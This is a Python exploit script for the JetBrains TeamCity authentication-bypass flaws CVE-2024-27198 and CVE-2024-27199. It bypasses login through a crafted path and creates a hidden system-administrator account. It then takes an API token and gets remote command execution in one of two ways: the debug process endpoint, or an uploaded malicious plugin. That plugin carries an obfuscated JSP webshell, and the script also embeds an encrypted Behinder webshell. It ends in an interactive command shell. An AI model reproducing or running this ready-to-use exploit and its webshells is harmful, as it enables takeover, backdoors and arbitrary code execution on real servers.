import re
import sys
import string
import random
import time
import zipfile
import urllib3
import requests
import argparse
#from faker import Faker
import xml.etree.ElementTree as ET
from urllib.parse import quote_plus

urllib3.disable_warnings()
token_name = "".join(random.choices(string.ascii_letters + string.digits, k=10))
GREEN = "\033[92m"
RESET = "\033[0m"
session = requests.Session()

def GetTeamCityVersion(target):
    get_teamcity_version_url = target + "/hax?jsp=/app/rest/server;.jsp"
    get_teamcity_version_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    }
    get_teamcity_version_response = session.get(url=get_teamcity_version_url, headers=get_teamcity_version_headers,
                                                 proxies=proxy, verify=False, allow_redirects=False, timeout=600)
    root = ET.fromstring(get_teamcity_version_response.text)
    teamcity_version = root.attrib.get("version")
    return teamcity_version

def GetOSName(target):
    get_os_name_url = target + "/hax?jsp=/app/rest/debug/jvm/systemProperties;.jsp"
    get_os_name_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    }
    get_os_name_response = session.get(url=get_os_name_url, headers=get_os_name_headers, proxies=proxy, verify=False,
                                        allow_redirects=False, timeout=600)
    root = ET.fromstring(get_os_name_response.text)
    teamcity_info = {
        "arch": root.find(".//property[@name='os.arch']").get("value"),
        "name": root.find(".//property[@name='os.name']").get("value")
    }
    return teamcity_info["name"].lower()

def GetUserID(response_text):
    try:
        root = ET.fromstring(response_text)
        user_info = {
            "username": root.attrib.get("username"),
            "id": root.attrib.get("id"),
            "email": root.attrib.get("email"),
        }
        return user_info["id"]
    except ET.ParseError as err:
        print(f"[-] Failed to parse user XML response: {err}", "!")
        return None

def GetOSVersion(target):
    try:
        get_os_name_url = target + "/hax?jsp=/app/rest/debug/jvm/systemProperties;.jsp"
        get_os_name_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        }
        get_os_name_response = session.get(url=get_os_name_url, headers=get_os_name_headers,
                                            proxies=proxy, verify=False, allow_redirects=False, timeout=600)
        root = ET.fromstring(get_os_name_response.text)
        teamcity_info = {
            "arch": root.find(".//property[@name='os.arch']").get("value"),
            "name": root.find(".//property[@name='os.name']").get("value")
        }
        return teamcity_info["name"].lower()
    except Exception as err:
        print("[-] Unable to obtain operating system version, please try manual exploitation.")
        print("[-] Error in func <GetOSVersion>, error message: " + str(err))

def GenerateRandomString(length):
    characters = string.ascii_letters + string.digits
    return "".join(random.choices(characters, k=length))

def GetEvilPluginZipFile(shell_file_content, plugin_name):
    # Generate fake data using random strings and placeholders instead of Faker
    random_company_name = "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
    random_url = "http://www." + "".join(random.choices(string.ascii_lowercase, k=10)) + ".com"
    random_sentence = "This is a randomly generated plugin for demonstration purposes."

    zip_resources = zipfile.ZipFile(f"{plugin_name}.jar", "w")
    if shell_file_content == "":
        evil_plugin_jsp = r"""<%@ page pageEncoding="utf-8"%>
<%@ page import="java.util.Scanner" %>
<%
    String op="";
    String query = request.getParameter("cmd");
    String fileSeparator = String.valueOf(java.io.File.separatorChar);
    Boolean isWin;
    if(fileSeparator.equals("\\")){
        isWin = true;
    }else{
        isWin = false;
    }
    if (query != null) {
        ProcessBuilder pb;
        if(isWin) {
            pb = new ProcessBuilder(new String(new byte[]{99, 109, 100}), new String(new byte[]{47, 67}), query);
        }else{
            pb = new ProcessBuilder(new String(new byte[]{47, 98, 105, 110, 47, 98, 97, 115, 104}), new String(new byte[]{45, 99}), query);
        }
        Process process = pb.start();
        Scanner sc = new Scanner(process.getInputStream()).useDelimiter("\\A");
        op = sc.hasNext() ? sc.next() : op;
        sc.close();
    }
%>
<%= op %>
"""
    else:
        evil_plugin_jsp = shell_file_content

    evil_plugin_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<teamcity-plugin xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="urn:schemas-jetbrains-com:teamcity-plugin-v1-xml">
    <info>
        <name>{plugin_name}</name>
        <display-name>{plugin_name}</display-name>
        <description>{random_sentence}</description>
        <version>1.0</version>
        <vendor>
            <name>{random_company_name}</name>
            <url>{random_url}</url>
        </vendor>
    </info>
    <deployment use-separate-classloader="true" node-responsibilities-aware="true"/>
</teamcity-plugin>"""

    # Create plugin .jar file with the generated JSP file
    zip_resources.writestr(f"buildServerResources/{plugin_name}.jsp", evil_plugin_jsp)
    zip_resources.close()

    # Create plugin .zip file
    zip_plugin = zipfile.ZipFile(f"{plugin_name}.zip", "w")
    zip_plugin.write(filename=f"{plugin_name}.jar", arcname=f"server/{plugin_name}.jar")
    zip_plugin.writestr("teamcity-plugin.xml", evil_plugin_xml)
    zip_plugin.close()


def GetPluginInfoJson(target, token):
    try:
        load_evil_plugin_url = target + "/admin/admin.html?item=plugins"
        load_evil_plugin_headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "Content-Type: application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
        }
        load_evil_plugin_response = session.get(url=load_evil_plugin_url, headers=load_evil_plugin_headers, proxies=proxy, verify=False,
                                                allow_redirects=False, timeout=600)
        register_plugin_pattern = r"BS\.Plugins\.registerPlugin\('([^']*)', '[^']*',[^,]*,[^,]*,\s*'([^']*)'\);"
        plugin_info_json = {}
        register_plugin_matches = re.findall(register_plugin_pattern, load_evil_plugin_response.text)
        for register_plugin_match in register_plugin_matches:
            plugin_name_ = register_plugin_match[0]
            uuid = register_plugin_match[1]
            plugin_info_json[plugin_name_] = uuid
        return plugin_info_json
    except:
        return None

def GetCSRFToken(target, token):
    get_csrf_token_url = target + "/authenticationTest.html?csrf"
    get_csrf_token_headers = {
        "Authorization": f"Bearer {token}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    }
    get_csrf_token_response = session.post(url=get_csrf_token_url, headers=get_csrf_token_headers, proxies=proxy, verify=False, allow_redirects=False, timeout=600)
    if get_csrf_token_response.status_code == 200:
        return get_csrf_token_response.text
    else:
        return None

def LoadEvilPlugin(target, plugin_name, token):
    plugin_info_json = GetPluginInfoJson(target, token)
    if not plugin_info_json.get(plugin_name):
        print("[-] The plugin just uploaded cannot be obtained. It may have been deleted by the administrator or AV or EDR")
        sys.exit(0)
    try:
        load_evil_plugin_url = target + "/admin/plugins.html"
        load_evil_plugin_headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
        }
        load_evil_plugin_data = f"enabled=true&action=setEnabled&uuid={plugin_info_json[plugin_name]}"
        load_evil_plugin_response = session.post(url=load_evil_plugin_url, headers=load_evil_plugin_headers, data=load_evil_plugin_data, proxies=proxy, verify=False, allow_redirects=False, timeout=600)
        if load_evil_plugin_response.status_code == 200 and ("<response>Plugin loaded successfully</response>" in load_evil_plugin_response.text or "is already loaded</response>" in load_evil_plugin_response.text):
            print(f"[+] Successfully load plugin {GREEN}{plugin_name}{RESET}")
            return True
        else:
            print(f"[-] Failed to load plugin {GREEN}{plugin_name}{RESET}")
            return False
    except:
        return False

def UploadEvilPlugin(target, plugin_name, token):
    try:
        upload_evil_plugin_url = target + "/admin/pluginUpload.html"
        upload_evil_plugin_header = {
            "Authorization": f"Bearer {token}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        }
        files = {
            "fileName": (None, f"{plugin_name}.zip"),
            "file:fileToUpload": (f"{plugin_name}.zip", open(f"{plugin_name}.zip", "rb").read(), "application/zip")
        }
        session.cookies.clear()
        upload_evil_plugin_response = session.post(url=upload_evil_plugin_url, files=files,
                                                   headers=upload_evil_plugin_header, proxies=proxy, verify=False,
                                                   allow_redirects=False, timeout=600)
        if upload_evil_plugin_response.status_code == 200:
            return True
        else:
            return False
    except Exception as e:
        print(e)
        return False

def ExecuteCommandByDebugEndpoint(target, os_version, command, token):
    try:
        command_encoded = quote_plus(command)
        if os_version == "linux":
            exec_cmd_url = target + f"/app/rest/debug/processes?exePath=/bin/sh&params=-c&params={command_encoded}"
        else:
            exec_cmd_url = target + f"/app/rest/debug/processes?exePath=cmd.exe&params=/c&params={command_encoded}"
        exec_cmd_headers = {
            "Authorization": f"Bearer {token}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        }
        exec_cmd_response = session.post(url=exec_cmd_url, headers=exec_cmd_headers, proxies=proxy, verify=False,
                                         allow_redirects=False, timeout=600)
        pattern = re.compile(r"StdOut:(.*?)StdErr:(.*?)$", re.DOTALL)
        match = re.search(pattern, exec_cmd_response.text)
        if match:
            stdout_content = match.group(1).strip()
            if stdout_content == "":
                stderr_content = match.group(2).strip()
                print(stderr_content.split("\n\n")[0])
            else:
                print(stdout_content)
        else:
            print("[-] Match failed. Response text: \n" + exec_cmd_response.text)
    except Exception as err:
        print("[-] Error in func <ExecuteCommand>, error message: " + str(err))

def ExecuteCommandByEvilPlugin(shell_url, command, token):
    try:
        command_encoded = quote_plus(command)
        exec_cmd_headers = {
            "Authorization": f"Bearer {token}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        exec_cmd_response = session.post(url=shell_url, headers=exec_cmd_headers, proxies=proxy, data=f"cmd={command_encoded}", verify=False, allow_redirects=False, timeout=600)
        if exec_cmd_response.status_code == 200:
            print(exec_cmd_response.text.strip())
        else:
            print(f"[-] Response Code: {exec_cmd_response.status_code}, Response text: {exec_cmd_response.text}\n")
    except Exception as err:
        print("[-] Error in func <ExecuteCommand>, error message: " + str(err))


def AddUser(target, username, password, domain):
    add_user_url = target + "/hax?jsp=/app/rest/users;.jsp"
    add_user_headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    }
    add_user_data = {
        "username": f"{username}",
        "password": f"{password}",
        "email": f"{username}@{domain}",
        "roles": {
            "role": [
                {
                    "roleId": "SYSTEM_ADMIN",
                    "scope": "g"
                }
            ]
        }
    }
    try:
        add_user_response = session.post(url=add_user_url, json=add_user_data, headers=add_user_headers, proxies=proxy,
                                         verify=False, allow_redirects=False, timeout=600)
        user_id = GetUserID(add_user_response.text)
        if add_user_response.status_code == 200 and user_id is not None:
            print(f"[+] User added successfully, username: {GREEN}{username}{RESET}, password: {GREEN}{password}{RESET}, user ID: {GREEN}{user_id}{RESET}")
            return user_id
        else:
            print(f"[-] Failed to add user, there is no vulnerability in {target}")
            sys.exit(0)
    except Exception as err:
        print("[-] Error in func <AddUser>, error message: " + str(err))
        sys.exit(0)


def GetToken(target, user_id):
    exploit_url = target + f"/hax?jsp=/app/rest/users/id:{user_id}/tokens/{token_name};.jsp"
    exploit_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    }
    try:
        exploit_response = session.post(url=exploit_url, headers=exploit_headers, proxies=proxy, verify=False,
                                        allow_redirects=False, timeout=600)
        root = ET.fromstring(exploit_response.text)
        token_info = {
            "name": root.attrib.get("name"),
            "value": root.attrib.get("value"),
            "creationTime": root.attrib.get("creationTime"),
        }
        return token_info["value"]
    except Exception as err:
        print(f"[-] Failed to parse token XML response")
        print("[-] Error in func <GetToken>, error message: " + str(err))


def ParseArguments():
    banner = r"""
 _____                     ____ _ _           ____   ____ _____ 
|_   _|__  __ _ _ __ ___  / ___(_) |_ _   _  |  _ \ / ___| ____|
  | |/ _ \/ _` | '_ ` _ \| |   | | __| | | | | |_) | |   |  _|  
  | |  __/ (_| | | | | | | |___| | |_| |_| | |  _ <| |___| |___ 
  |_|\___|\__,_|_| |_| |_|\____|_|\__|\__, | |_| \_\\____|_____|
                                      |___/                     
                                                                            Author: @W01fh4cker
                                                                            Github: https://github.com/W01fh4cker
    """
    print(banner)
    parser = argparse.ArgumentParser(
        description="CVE-2024-27198 & CVE-2024-27199 Authentication Bypass --> RCE in JetBrains TeamCity Pre-2023.11.4")
    parser.add_argument("-u", "--username", type=str,
                        help="username you want to add. If left blank, it will be randomly generated.", required=False)
    parser.add_argument("-p", "--password", type=str,
                        help="password you want to add. If left blank, it will be randomly generated.", required=False)
    parser.add_argument("-t", "--target", type=str, help="target url", required=True)
    parser.add_argument("-d", "--domain", type=str, default="example.com", help="The domain name of the email address",
                        required=False)
    parser.add_argument("-f", "--file", type=str, help="The shell that you want to upload", required=False)
    parser.add_argument("--proxy", type=str, help="eg: http://127.0.0.1:8080", required=False)
    parser.add_argument("--behinder4", help="Upload the webshell of Behinder 4.0 [https://github.com/rebeyond/Behinder], the protocol is default_xor_base64", required=False, action="store_true")
    return parser.parse_args()


if __name__ == "__main__":
    args = ParseArguments()
    if not args.username:
        username = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    else:
        username = args.username
    if not args.password:
        password = "".join(random.choices(string.ascii_letters + string.digits, k=10))
    else:
        password = args.password
    if not args.proxy:
        proxy = {}
    else:
        proxy = {
            "http": args.proxy,
            "https": args.proxy
        }
    if args.file:
        shell_content = open(args.file, "r", encoding="utf-8").read()
    elif args.behinder4:
        shell_content = r"""<%@page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*" %>
<%!
private byte[] Decrypt(byte[] data) throws Exception
{
     byte[] decodebs;
        Class baseCls ;
                try{
                    baseCls=Class.forName("java.util.Base64");
                    Object Decoder=baseCls.getMethod("getDecoder", null).invoke(baseCls, null);
                    decodebs=(byte[]) Decoder.getClass().getMethod("decode", new Class[]{byte[].class}).invoke(Decoder, new Object[]{data});
                }
                catch (Throwable e)
                {
                    baseCls = Class.forName("sun.misc.BASE64Decoder");
                    Object Decoder=baseCls.newInstance();
                    decodebs=(byte[]) Decoder.getClass().getMethod("decodeBuffer",new Class[]{String.class}).invoke(Decoder, new Object[]{new String(data)});

                }
    String key="e45e329feb5d925b";
	for (int i = 0; i < decodebs.length; i++) {
		decodebs[i] = (byte) ((decodebs[i]) ^ (key.getBytes()[i + 1 & 15]));
	}
	return decodebs;
}
%>
<%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return
        super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            byte[] buf = new byte[512];
            int length=request.getInputStream().read(buf);
            while (length>0)
            {
                byte[] data= Arrays.copyOfRange(buf,0,length);
                bos.write(data);
                length=request.getInputStream().read(buf);
            }
            out.clear();
            out=pageContext.pushBody();
        new U(this.getClass().getClassLoader()).g(Decrypt(bos.toByteArray())).newInstance().equals(pageContext);}
%>"""
    else:
        shell_content = ""
    target = args.target.rstrip("/")
    teamcity_version = GetTeamCityVersion(target)
    plugin_name = GenerateRandomString(8)
    user_id = AddUser(target=target, username=username, password=password, domain=args.domain)
    token = GetToken(target, user_id)
    csrf_token = GetCSRFToken(target, token)
    session.headers.update({"X-TC-CSRF-Token": csrf_token})
    os_version = GetOSVersion(target)
    print(f"[+] The target operating system version is {GREEN}{os_version}{RESET}")
    if "2023.11." in teamcity_version.split(" ")[0]:
        print(f"[!] The current version is: {teamcity_version}. The official has deleted the /app/rest/debug/processes port. You can only upload a malicious plugin to upload webshell and cause RCE.")
        continue_code = input("[!] The program will automatically upload the webshell ofbehinder3.0. You can also specify the file to be uploaded through the parameter -f. Do you wish to continue? (y/n)")
        if continue_code.lower() != "y":
            sys.exit(0)
        else:
            GetEvilPluginZipFile(shell_content, plugin_name)
            if UploadEvilPlugin(target, plugin_name, token):
                print(f"[+] The malicious plugin {GREEN}{plugin_name}{RESET} was successfully uploaded and is trying to be activated")
                if LoadEvilPlugin(target, plugin_name, token):
                    shell_url = f"{target}/plugins/{plugin_name}/{plugin_name}.jsp"
                    print(f"[+] The malicious plugin {GREEN}{plugin_name}{RESET} was successfully activated! Webshell url: {GREEN}{shell_url}{RESET}")
                    if args.behinder4:
                        print(f"[+] Behinder4.0 Custom headers: \n{GREEN}X-TC-CSRF-Token: {csrf_token}\nAuthorization: Bearer {token}{RESET}")
                        print(f"[+] Behinder4.0 transmission protocol: {GREEN}default_xor_base64{RESET}")
                    if not args.file and not args.behinder4:
                        print("[+] Please start executing commands freely! Type <quit> to end command execution")
                        while True:
                            command = input(f"{GREEN}command > {RESET}")
                            if command == "quit":
                                sys.exit(0)
                            ExecuteCommandByEvilPlugin(shell_url, command, token)
                else:
                    print(f"[-] Malicious plugin {GREEN}{plugin_name}{RESET} activation failed")
            else:
                print(f"[-] Malicious plugin {GREEN}{plugin_name}{RESET} upload failed")
    else:
        print("[+] Please start executing commands freely! Type <quit> to end command execution")
        while True:
            command = input(f"{GREEN}command > {RESET}")
            if command == "quit":
                sys.exit(0)
            ExecuteCommandByDebugEndpoint(target, os_version, command, token)
